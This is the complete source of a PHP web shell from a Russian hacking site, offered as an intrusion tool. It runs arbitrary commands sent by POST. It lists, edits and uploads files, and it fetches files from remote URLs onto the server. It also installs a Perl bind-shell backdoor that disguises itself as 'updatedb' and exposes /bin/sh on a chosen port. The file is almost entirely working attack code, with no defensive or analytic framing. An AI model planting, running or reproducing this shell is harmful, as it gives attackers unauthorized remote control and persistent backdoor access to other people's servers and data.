<?
error_reporting(0);
/* Loader'z WEB Shell v 0.1 {14 марта 2005}
Оффсайт: www.pro-hack.ru
Это первая версия скрипта. Вот какие он поддерживает функции.
- Работа с файловой системой с помощью PHP. В удобной таблице представлено содержимое текущей паки.
- Просмотр и редактирование файлов.
- Закачка файлов с другого сервера с помощью HTTP.
- Закачка файлов с вашего жесткого диска.
- Выполнение произвольных команд на сервере.
- Скрипт выдает значение некоторых переменных. Например он сообщит включен ли сейф мод, если да, то скрипт выведет директорию которая,
вам доступна, а так же путь, где вы можете выполнять команды.
- Работа скрипта основана на определении типа сервера.
- Если скрипт работает под управление ОС Windows, данные получаемые при выполнении команд перекодируются в win-1251.
- Присутствует простенький скрипт перл-бинд. Вы можете указать домашнюю директрию и порт на котором повесится бекдор.
Loader Pro-Hack.ru
*/
?>

<style type='text/css'>
html { overflow-x: auto }
BODY { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; margin: 0px; padding: 0px; text-align: center; color: #c0c0c0; background-color: #000000 }
TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: #c0c0c0; background-color: #0000000 }
BODY,TD {FONT-SIZE: 13px; FONT-FAMILY: verdana, arial, helvetica;}
A:link {COLOR: #666666; TEXT-DECORATION: none}
A:active {	COLOR: #666666; TEXT-DECORATION: none;}
A:visited {COLOR: #666666; TEXT-DECORATION: none;}
A:hover {COLOR: #999999; TEXT-DECORATION: none;}
BODY {
	SCROLLBAR-FACE-COLOR: #DCE7EF;
	SCROLLBAR-HIGHLIGHT-COLOR: #dbdbdb;
	SCROLLBAR-SHADOW-COLOR: #598BB6;
	SCROLLBAR-3DLIGHT-COLOR: #598BB6;
	SCROLLBAR-ARROW-COLOR: #598BB6;
	SCROLLBAR-TRACK-COLOR: #F4FAFD;
	SCROLLBAR-DARKSHADOW-COLOR: #dbdbdb}



fieldset.search { padding: 6px; line-height: 150% }

label { cursor: pointer }

form { display: inline }

img { vertical-align: middle; border: 0px }

img.attach { padding: 2px; border: 2px outset #000033 }


#logostrip { padding: 0px; margin: 0px; background-color: #000000; border: 1px solid #CBAB78; }
#content { padding: 10px; margin: 10px; background-color: #000000; border: 1px solid #CBAB78; }
#logo { FONT-SIZE: 50px; }
</style>


<title>Loader'z WEB shell</title>

<table height=100% "width="100%">
<tr><td align="center" valign="top">


<table><tr><td>
<?php

$dir = $_POST['dir'];
$dir = stripslashes($dir);

$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);


$bind = "
#!/usr/bin/perl

\$port = $port;
\$port = \$ARGV[0] if \$ARGV[0];
exit if fork;
$0 = \"updatedb\" . \" \" x100;
\$SIG{CHLD} = 'IGNORE';
use Socket;
socket(S, PF_INET, SOCK_STREAM, 0);
setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
bind(S, sockaddr_in($port, INADDR_ANY));
listen(S, 50);
while(1)
{
	accept(X, S);
	unless(fork)
	{
		open STDIN, \"<&X\";
		open STDOUT, \">&X\";
		open STDERR, \">&X\";
		close X;
		exec(\"/bin/sh\");
	}
	close X;
}
";

function decode($buffer){

return  convert_cyr_string ($buffer, d, w);

}



/*Начинается*/

/*Опрделяем тип системы*/
$servsoft = $_SERVER['SERVER_SOFTWARE'];

if (ereg("Win32", $servsoft, $reg)){
$sertype = "winda";
}
else
{
$sertype = "other";}



echo $servsoft . "<br>";
chdir($dir);
echo "Total space " . (int)(disk_total_space(getcwd())/(1024*1024)) . "Mb " . "Free space " . (int)(disk_free_space(getcwd())/(1024*1024)) . "Mb <br>";

if ($sertype == "winda"){

ob_start('decode');
echo "Version: ";
echo passthru("ver") . "<br><br>";
ob_end_flush();
}

if ($sertype == "other"){
echo "id:";

echo passthru("id") . "<br>";
echo "uname:";
echo passthru("uname -a") . "<br><br>";
}




if($_POST['post'] == "yes" and $HTTP_POST_FILES["userfile"][name] !== "")
{
copy($HTTP_POST_FILES["userfile"]["tmp_name"],$HTTP_POST_FILES["userfile"]["name"]);
}

if(($_POST['fileto'] != "")||($_POST['filefrom'] != ""))

{
$data = implode("", file($_POST['filefrom']));
$fp = fopen($_POST['fileto'], "wb");
fputs($fp, $data);
$ok = fclose($fp);
if($ok)
{
$size = filesize($_POST['fileto'])/1024;
$sizef = sprintf("%.2f", $size);
print "<center><div id=logostrip>Download - OK. (".$sizef."кБ)</div></center>";
}
else
{
print "<center><div id=logostrip>Something is wrong. Download - IS NOT OK</div></center>";
}
}

if ($_POST['installbind']){

if (is_dir($_POST['installpath']) == true){
chdir($_POST['installpath']);
$_POST['installpath'] = "temp.pl";}


$fp = fopen($_POST['installpath'], "w");
fwrite($fp, $bind);
fclose($fp);

exec("perl " . $_POST['installpath']);
chdir($dir);


}

if ($_POST['editfile']){
$fp = fopen($_POST['editfile'], "r");
$filearr = file($_POST['editfile']);

foreach ($filearr as $string){
$string = str_replace("<" , "&lt;" , $string);
$string = str_replace(">" , "&gt;" , $string);
$content = $content . $string;
}

echo "<center><div id=logostrip>Edit file: $editfile </div><form action=\"$REQUEST_URI\" method=\"POST\"><textarea name=content cols=122 rows=20>$content</textarea>
<input type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<input type=\"hidden\" name=\"savefile\" value=\"{$_POST['editfile']}\"><br>
<input type=\"submit\" name=\"submit\" value=\"Save\"></form></center>";
fclose($fp);
}

if($_POST['savefile']){

$fp = fopen($_POST['savefile'], "w");
$content = stripslashes($content);
fwrite($fp, $content);
fclose($fp);
echo "<center><div id=logostrip>Successfully saved!</div></center>";

}


if ($cmd){

echo "<center><textarea cols=122 rows=20>";
if($sertype == "winda"){
ob_start('decode');
passthru($cmd);
ob_end_flush();}
else{
passthru($cmd);
}

echo "</textarea></center>";


}else{
$arr = array();

$arr = array_merge($arr, glob("*"));
$arr = array_merge($arr, glob(".*"));
$arr = array_merge($arr, glob("*.*"));
$arr = array_unique($arr);
sort($arr);
echo "<table><tr><td>Name</td><td>Type</td><td>Size</td><td>Last access</td><td>Last change</td><td>Perms</td><td>Write</td><td>Read</td></tr>";

foreach ($arr as $filename) {

if ($filename != "." and $filename != ".."){

if (is_dir($filename) == true){
$directory = "";
$directory = $directory . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td></td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . fileperms($filename);
if (is_writable($filename) == true){
$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";

}

if (is_readable($filename) == true){
$directory = $directory . "<td>Yes</td>";}
else{
$directory = $directory . "<td>No</td>";
}
$dires = $dires . $directory;
}

if (is_file($filename) == true){
$file = "";
$file = $file . "<tr><td>$filename</td><td>" . filetype($filename) . "</td><td>" . filesize($filename) . "</td><td>" . date("G:i j M Y",fileatime($filename)) . "</td><td>" . date("G:i j M Y",filemtime($filename)) . "</td><td>" . fileperms($filename);
if (is_writable($filename) == true){
$file = $file . "<td>Yes</td>";}
else{
$file = $file . "<td>No</td>";
}

if (is_readable($filename) == true){
$file = $file . "<td>Yes</td></td></tr>";}
else{
$file = $file . "<td>No</td></td></tr>";
}
$files = $files . $file;
}



}



}
echo $dires;
echo $files;
echo "</table><br>";
}



echo "
<form action=\"$REQUEST_URI\" method=\"POST\">
Command:<INPUT type=\"text\" name=\"cmd\" size=30 value=\"$cmd\">


Directory:<INPUT type=\"text\" name=\"dir\" size=30 value=\"";

echo getcwd();
echo "\">
<INPUT type=\"submit\" value=\"Do it\"></form>";




if (ini_get('safe_mode') == 1){echo "<br><font size=\"3\"color=\"#cc0000\"><b>SAFE MOD IS ON<br>
Including from here: "
. ini_get('safe_mode_include_dir') . "<br>Exec here: " . ini_get('safe_mode_exec_dir'). "</b></font>";}








echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
Download here <b>from</b>:
<INPUT type=\"text\" name=\"filefrom\" size=30 value=\"http://\">
<b>into:</b>
<INPUT type=\"text\" name=\"fileto\" size=30>
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Download\"></form></div>";

echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\" enctype=\"multipart/form-data\">
<INPUT type=\"file\" name=\"userfile\">
<INPUT type=\"hidden\" name=\"post\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Download\"></form></div>";



echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
Install bind
<b>Temp path</b><input type=\"text\" name=\"installpath\" value=\"" . getcwd() . "\">
<b>Port</b><input type=\"text\" name=\"port\" value=\"3333\">

<INPUT type=\"hidden\" name=\"installbind\" value=\"yes\">
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() . "\">
<INPUT type=\"submit\" value=\"Install\"></form></div>";


echo "<div><FORM method=\"POST\" action=\"$REQUEST_URI\">
File to edit:
<input type=\"text\" name=\"editfile\" >
<INPUT type=\"hidden\" name=\"dir\" value=\"" . getcwd() ."\">
<INPUT type=\"submit\" value=\"Edit\"></form></div>";



?>
</td></tr></table>


</td></tr>
<tr valign="BOTTOM">
<td valign=bottom><center>Coded by Loader <a href="http://pro-hack.ru">Pro-Hack.RU</a></center></td>
</tr>
</table>

